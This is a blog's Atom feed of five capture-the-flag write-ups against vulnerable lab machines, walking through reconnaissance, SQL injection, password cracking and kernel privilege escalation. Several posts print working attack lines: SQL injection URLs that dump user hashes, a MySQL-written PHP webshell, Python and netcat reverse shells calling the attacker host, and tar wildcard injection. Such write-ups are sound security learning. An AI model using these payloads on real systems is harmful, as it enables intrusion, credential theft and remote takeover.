<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: vulhub | Bob1Bob2]]></title>
  <link href="http://wg135.github.io/blog/categories/vulhub/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2016-08-12T13:07:52-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Hackademic RTB2]]></title>
    <link href="http://wg135.github.io/blog/2016/08/10/hackademic-rtb2/"/>
    <updated>2016-08-10T15:38:10-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/10/hackademic-rtb2</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>Netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Joomscan</li>
<li>Metasploit</li>
</ul>


<h3>Vulnerabilities:</h3>

<p><a href="https://www.exploit-db.com/exploits/15285/">Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation</a></p>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="/images/blog/vulhub/rtb2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.158 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.158 -p-</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like port 80 is opening and port 666 is filtered.</p>

<p>Use both wfuzz to scan the host</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.158/FUZZ 2&gt;/dev/null
</code></pre>

<p><img src="/images/blog/vulhub/rtb2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>find <code>phpmyadmin</code></p>

<p>check the webpage, and need to login, try to use sqli to by pass the autherication, but doesn&rsquo;t work. Now step back, enumerate more.</p>

<p>I use nmap to scan the target again. find port 666 now is opening. So there may be a port knocking existing.</p>

<p><img src="/images/blog/vulhub/rtb2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>use wfuzz scan again</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.158:666/FUZZ 2&gt;/dev/null
</code></pre>

<p><img src="/images/blog/vulhub/rtb2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>check the webpage <code>http://192.168.41.158:666/</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like it is joomla</p>

<p>now use Joomba to scan the app</p>

<p><code>joomscan -u http://192.168.41.158:666/</code></p>

<p>nothing cool comes out.</p>

<p>use metasploit</p>

<p><code>search joomla</code></p>

<p>I use <code>auxiliary/scanner/http/joomla_plugins</code></p>

<pre><code>msf &gt; use auxiliary/scanner/http/joomla_plugins
msf auxiliary(joomla_plugins) &gt; set rhosts 192.168.41.158
msf auxiliary(joomla_plugins) &gt; set rport 666
msf auxiliary(joomla_plugins) &gt; run
</code></pre>

<p><img src="/images/blog/vulhub/rtb2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>use <code>/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid='</code></p>

<p>so first step, verify the sql injection:</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid='</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>then try to get column number:</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 1--</code>
<code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 2--</code>
<code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 order by 3--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>the column number is 2</p>

<p>next find out which column we can use</p>

<p><code>158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1,2--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>Okay. Column 2</p>

<p>try to check mysql version</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1,@@version--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>get all table name</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, table_name from information_schema.tables--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>get all column name of table jos_users</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, column_name from information_schema.columns where table_name = 'jos_users'--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>next, get column username and password:</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, concat(username,0x20,password) from jos_users--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<p>The format is hash:salt</p>

<p>use my previous joomla hash crack script <a href="https://github.com/wg135/script/blob/master/crackjoomla.py">crackjoomla.py</a></p>

<pre><code>./crackjoomla.py 992396d7fc19fd76393f359cb294e300 70NFLkBrApLamH9VNGjlViJLlJsB60KF /usr/share/wordlists/rockyou.txt 
</code></pre>

<p>for administrator, I didn&rsquo;t get the password</p>

<p>for JSmith, password is matrix, for BTallor, password is victim.</p>

<p>login using JSmith, find nowhere can upload the webshell. check the configuration.php file</p>

<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, load_file('/var/www/configuration.php')--</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>find the username/password. Use it login phpmyadmin</p>

<p><img src="/images/blog/vulhub/rtb2/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p>now I will create a backdoor using mysql:</p>

<pre><code>create database pwn;
create table backdoor(script text);
insert into backdoor(script) values('&lt;?php echo "&lt;pre&gt;"; system($_GET["cmd"]); echo "&lt;/pre&gt;"; ?&gt;');
select * into outfile "/var/www/backdoor3.php" from backdoor;
</code></pre>

<p>check the backdoor.</p>

<p><code>http://192.168.41.158:666/backdoor3.php?cmd=uname -a</code></p>

<p><img src="/images/blog/vulhub/rtb2/Selection_023.png" title="[title manually exploit [alt text]]" ></p>

<p>good.</p>

<p>Setup netcat and</p>

<pre><code>http://192.168.41.158:666/backdoor3.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.41.149",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
</code></pre>

<p><img src="/images/blog/vulhub/rtb2/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p><code>uname -a</code></p>

<p>find the kernel version is 2.6.32. Find an exploit Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation.</p>

<p><img src="/images/blog/vulhub/rtb2/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[hackademic:rtb1]]></title>
    <link href="http://wg135.github.io/blog/2016/08/03/hackademic-rtb1/"/>
    <updated>2016-08-03T10:30:58-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/03/hackademic-rtb1</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>Netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Wpscan</li>
</ul>


<h3>Vulnerabilities:</h3>

<p><a href="https://www.exploit-db.com/exploits/15285/">Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation</a></p>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="/images/blog/vulhub/rtb1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.157 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.157 -p-</code></p>

<p><img src="/images/blog/vulhub/rtb1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Only port 80 is opening.</p>

<p>Use both wfuzz and nikto to scan the host, nothing interesting&hellip;</p>

<p>Check the page,</p>

<p><img src="/images/blog/vulhub/rtb1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>find a link <code>http://192.168.41.157/Hackademic_RTB1/</code></p>

<p>use wfuzz to scan:</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.157/Hackademic_RTB1/FUZZ 2&gt;/dev/null
</code></pre>

<p><img src="/images/blog/vulhub/rtb1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>There is a wordpress.</p>

<p>use wpscan to scan</p>

<p><code>wpscan http://192.168.41.157/Hackademic_RTB1/</code></p>

<p><img src="/images/blog/vulhub/rtb1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>There are a couple of exploits, I tried both of them and no luck.</p>

<p>Enumerate the page, find a possible SQL injection potint:</p>

<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0'</code></p>

<p>looks like parameter cat is vulnerable</p>

<p><img src="/images/blog/vulhub/rtb1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>next try:</p>

<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0 order by 1</code></p>

<p><img src="/images/blog/vulhub/rtb1/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>keep trying until</p>

<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0 order by 6</code></p>

<p><img src="/images/blog/vulhub/rtb1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>got error. Now I know the current table in user by the vulnerable page has 5 columns.</p>

<p>next</p>

<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0 union all select 1,2,3,4,5</code></p>

<p><img src="/images/blog/vulhub/rtb1/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>now I can use second column to do injection.</p>

<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0%20union%20all%20select%201,@@version,3,4,5</code></p>

<p><img src="/images/blog/vulhub/rtb1/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>next use sqlmap to get all tables,</p>

<p><code>sqlmap -u "http://192.168.41.157/Hackademic_RTB1/?cat=0" --dbms mysql --tables --level=5 --risk=3</code></p>

<p>get table names:</p>

<p><img src="/images/blog/vulhub/rtb1/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>I want to check table <code>wp_users</code></p>

<p><code>sqlmap -u 'http://192.168.41.157/Hackademic_RTB1/?cat=0' -D wordpress -T wp_users  --columns</code></p>

<p><img src="/images/blog/vulhub/rtb1/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<p>dump these two columns</p>

<p><code>sqlmap -u 'http://192.168.41.157/Hackademic_RTB1/?cat=0' -D wordpress -T wp_users -C user_nickname,user_pass --dump</code></p>

<p><img src="/images/blog/vulhub/rtb1/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>now we can edit php webshell via plugin</p>

<p><img src="/images/blog/vulhub/rtb1/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p>Only textile1.php can be updated. Use that file to edit shell.</p>

<p>Setup netcat, and load <code>http://192.168.41.157/Hackademic_RTB1/wp-content/plugins/textile1.php</code></p>

<p>get shell</p>

<p><img src="/images/blog/vulhub/rtb1/Selection_021.png" title="[title manually exploit [alt text]]" ></p>

<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p><code>uname -a</code></p>

<p>get the <code>Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux</code></p>

<p>I tried serveral local exploits and find this one works:</p>

<p><img src="/images/blog/vulhub/rtb1/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p>get the root:</p>

<p><img src="/images/blog/vulhub/rtb1/Selection_023.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Droopy:V0.2]]></title>
    <link href="http://wg135.github.io/blog/2016/08/01/droopy-v0-dot-2/"/>
    <updated>2016-08-01T10:57:14-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/01/droopy-v0-dot-2</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Metasploit</li>
<li>droopescan</li>
</ul>


<h3>Vulnerabilities:</h3>

<ul>
<li><a href="https://www.exploit-db.com/exploits/34992/">Drupal HTTP Parameter Key/Value SQL Injection</a></li>
<li><a href="https://www.exploit-db.com/exploits/37292/">Linux Kernel 3.13.0 &lt; 3.19 &lsquo;overlayfs&rsquo; Local Root Shell</a></li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="/images/blog/vulhub/drooy2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.155 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.155 -p-</code></p>

<p><img src="/images/blog/vulhub/drooy2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Only port 80 is opening.</p>

<p>use nikto to scan</p>

<p><code>nikto -h 192.168.41.155</code></p>

<p><img src="/images/blog/vulhub/drooy2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>No useful info come out.</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.155/FUZZ 2&gt;/dev/null
</code></pre>

<p><img src="/images/blog/vulhub/drooy2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>still same thing.</p>

<p>check the <a href="http://192.168.41.155">http://192.168.41.155</a></p>

<p><img src="/images/blog/vulhub/drooy2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Find the target use <code>Drupal</code></p>

<h3>Use Metasploit</h3>

<p>in msfconsole, search drupal, find an interesting exploit <code>exploit/multi/http/drupal_drupageddon</code></p>

<pre><code>msf &gt; use exploit/multi/http/drupal_drupageddon
msf exploit(drupal_drupageddon) &gt; set rhost 192.168.41.155
msf exploit(drupal_drupageddon) &gt; exploit 
</code></pre>

<p><img src="/images/blog/vulhub/drooy2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>get meterpreter, do command <code>shell</code> to get shell.</p>

<p>use <code>python -c 'import pty; pty.spawn("/bin/bash")'</code> get bash</p>

<p>user is www-data, next try to get root</p>

<p><code>uname -a</code></p>

<p><code>Linux droopy 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</code></p>

<p>the kernel is 3.1.30</p>

<p><code>searchsploit 3.1.30</code></p>

<p><img src="/images/blog/vulhub/drooy2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>upload the exploit, compile and run it, get the root:</p>

<p><img src="/images/blog/vulhub/drooy2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<h3>Another way</h3>

<p>use droopescan to scan</p>

<p><code>droopescan scan drupal -u http://192.168.41.155/ -t 8</code></p>

<p><img src="/images/blog/vulhub/drooy2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>now I know the version is 7.30</p>

<p><code>searchsploit drupal</code></p>

<p>find the 34992.txt exploit works.</p>

<p><img src="/images/blog/vulhub/drooy2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p><code>./34992.py -t http://192.168.41.155 -u test -p test</code></p>

<p><img src="/images/blog/vulhub/drooy2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>this exploit creates an admin account test/test, then in <code>Modules</code>, make sure the <code>PHP filter</code> is selected.</p>

<p><img src="/images/blog/vulhub/drooy2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>Also in <code>People</code> -> <code>Permissions</code>, check <code>Use the PHP code text format</code></p>

<p><img src="/images/blog/vulhub/drooy2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>In  <code>configuration</code> -> <code>Content authoring</code> -> <code>Text formats</code>,  need to check administrator box.</p>

<p><img src="/images/blog/vulhub/drooy2/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>Then create a new content (copy and paste reverse shell php code) and use PhP Code in the format, save it, then netcat will get the shell.</p>

<p><img src="/images/blog/vulhub/drooy2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>Then use same method in the first part of this post to get the root.</p>

<p>DONE</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[milnet1]]></title>
    <link href="http://wg135.github.io/blog/2016/07/28/milnet1/"/>
    <updated>2016-07-28T14:47:38-05:00</updated>
    <id>http://wg135.github.io/blog/2016/07/28/milnet1</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Tamper Data</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="/images/blog/vulhub/milnet1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.154 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.154 -p-</code></p>

<p><img src="/images/blog/vulhub/milnet1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>port 22 and 80 are opening</p>

<p>use nmap to run http-enum script:</p>

<p><code>nmap 192.168.41.154 -p80 --script http-enum</code></p>

<p><img src="/images/blog/vulhub/milnet1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>The info.php file exists.</p>

<p><img src="/images/blog/vulhub/milnet1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>use nikto to scan</p>

<p><code>nikto -h 192.168.41.154</code></p>

<p><img src="/images/blog/vulhub/milnet1/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>use wfuzz to scan</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.154/FUZZ 2&gt;/dev/null</code></p>

<p>nothing cool.</p>

<p>I use Tamper Data to exam the GET/POST request parameters.</p>

<p><img src="/images/blog/vulhub/milnet1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>find an interesting parameter. setup a netcat listerner, and change the parameter value to <code>http://192.168.41.149/reverse?</code></p>

<p>(Here, at first I used reverse.php which created a local reverse shell back to my Kali. I guess there is a filter in target can filter php file, so I just remove .php)</p>

<p>get the shell:</p>

<p><img src="/images/blog/vulhub/milnet1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>In order to make the process easier, I create a short script <a href="https://github.com/wg135/script/blob/master/send_post.py">send_post.py</a>:</p>

<pre><code class="python send_post.py">#!/usr/bin/env python
#send post requst to the target

import requests
import json

url= 'http://192.168.41.154/content.php'

headers = {
    "Host" : "192.168.41.154",
    "User-Agent" : "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language" : "en-US,en;q=0.5",
    "Accept-Encoding" : "gzip, deflate",
    "Referer" : "http://192.168.41.154/nav.php",
    "Connection" : "keep-alive",
    "Content-Type" : "application/x-www-form-urlencoded",
    "Content-Length" : "40"
}

payload = {
    "route" : "http://192.168.41.149/reverse?"
}


r = requests.post(url, headers=headers, data=payload)
print (r.status_code)
</code></pre>

<p>Next enumeration, no luck on kernerl exploit, check contab job.</p>

<p><code>cat /etc/cron*</code></p>

<p>got <code>/etc/crontab</code></p>

<p><img src="/images/blog/vulhub/milnet1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>read that file</p>

<p><code>cat /etc/crontab</code></p>

<p><img src="/images/blog/vulhub/milnet1/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>found an interesting file: <code>/backup/backup.sh</code></p>

<p>check that file</p>

<p><img src="/images/blog/vulhub/milnet1/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>it uses tar. Searched exploits, no luck.</p>

<p>Under path <code>/home/langman/SDINET</code>, I found a file <code>DefenseCode_Unix_WildCards_Gone_Wild.txt</code> shows tar cdode execution,</p>

<p><img src="/images/blog/vulhub/milnet1/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>in kali:</p>

<p><code>nc -nlvp 443</code></p>

<p>in target:</p>

<pre><code>$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.41.149 443 &gt; /tmp/f" &gt; shell.sh
$ touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
$ touch "/var/www/html/--checkpoint=1"
</code></pre>

<p>get the root:</p>

<p><img src="/images/blog/vulhub/milnet1/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Sidney:0.2]]></title>
    <link href="http://wg135.github.io/blog/2016/07/27/sidney-0-dot-2/"/>
    <updated>2016-07-27T10:23:04-05:00</updated>
    <id>http://wg135.github.io/blog/2016/07/27/sidney-0-dot-2</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Burp Suite</li>
<li>Hydra</li>
</ul>


<h3>Vulnerabilities:</h3>

<ul>
<li><a href="https://www.exploit-db.com/exploits/26474/">PHPFM Arbitrary File Upload</a></li>
<li><a href="https://www.exploit-db.com/exploits/39772/">Linux Kernel 4.4.x (Ubuntu 16.04) - &lsquo;double-fdput()&rsquo; in bpf(BPF_PROG_LOAD) Local Root Exploit</a></li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="/images/blog/vulhub/sidney2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.153 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.153 -p-</code></p>

<p><img src="/images/blog/vulhub/sidney2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Only port 80 is opening.</p>

<p>use nikto to scan</p>

<p><code>nikto -h 192.168.41.153</code></p>

<p>No useful info come out.</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.153/FUZZ 2&gt;/dev/null
</code></pre>

<p>still same thing.</p>

<p>check the <a href="http://192.168.41.153,">http://192.168.41.153,</a> find a picture,</p>

<p><img src="/images/blog/vulhub/sidney2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>check the picture info:</p>

<p><img src="/images/blog/vulhub/sidney2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>find a path:  <code>http://192.168.41.153/commodore64/</code></p>

<p>now use nikto to scan that path,</p>

<p><code>nikto -h http://192.168.41.153/commodore64/</code></p>

<p><img src="/images/blog/vulhub/sidney2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>find an interesting file <code>index.php</code>,</p>

<p>check that file,</p>

<p><img src="/images/blog/vulhub/sidney2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>get the login page, and the CMS seems PHPFM</p>

<p><code>searchsploit PHPFM</code></p>

<p>find a PHPFM Arbitrary File Upload, now I need to find a way to upload the shell. First, I have to get the access to the PHPFM</p>

<p>In <code>http://192.168.41.153/commodore64</code>, I found:</p>

<p><img src="/images/blog/vulhub/sidney2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>I will try <code>robhubbard</code> as username. Password a C64 sound chip lowercase 3letters4digits without spaces&hellip; After checking wikipedia and more sites, seems that MOS is one of the sound chips (3 letters) Time to make our dictionary with MOS + 4 numbers and minimum+maximum of 7 words.</p>

<p><code>crunch 7 7 -t mos%%%% &gt; test.txt</code></p>

<p>before using hydra to crack password, I use Burp to get incorrect login response,</p>

<p><img src="/images/blog/vulhub/sidney2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<pre><code>hydra -l robhubbard -P test.txt 192.168.41.153 http-post-form "/commodore64/index.php:input_username=^USER^&amp;input_password=^PASS^:Login" -V
</code></pre>

<p>get the password <code>mos6518</code></p>

<p><img src="/images/blog/vulhub/sidney2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>login, get the page:</p>

<p><img src="/images/blog/vulhub/sidney2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>set up netcat and go to <code>http://192.168.41.153/commodore64/reverse.php</code></p>

<p>get the shell:</p>

<p><img src="/images/blog/vulhub/sidney2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>Since the Linux kernel version here is 4.4.0</p>

<p><code>searchsploit 4.4 | grep linux</code></p>

<p>exploit found <code>Linux Kernel 4.4.x (Ubuntu 16.04) - double-fdput() in bpf(BPF_PROG_LOAD) Local Root Exploit</code></p>

<p>In Kali:</p>

<pre><code>wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
cp 39772.zip /var/www/html/
</code></pre>

<p>In target:</p>

<p>upload the 39772.zip via phpfm, in the shell</p>

<p><code>find / -name 39772.zip</code></p>

<p>shows the file in <code>/var/www/html/commodore64/</code></p>

<pre><code>cd  /var/www/html/commodore64/
unzip 39772.zip
cd 39772
tar xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit/
./compile.sh
./doubleput
</code></pre>

<p>get the root:</p>

<p><img src="/images/blog/vulhub/sidney2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
</feed>
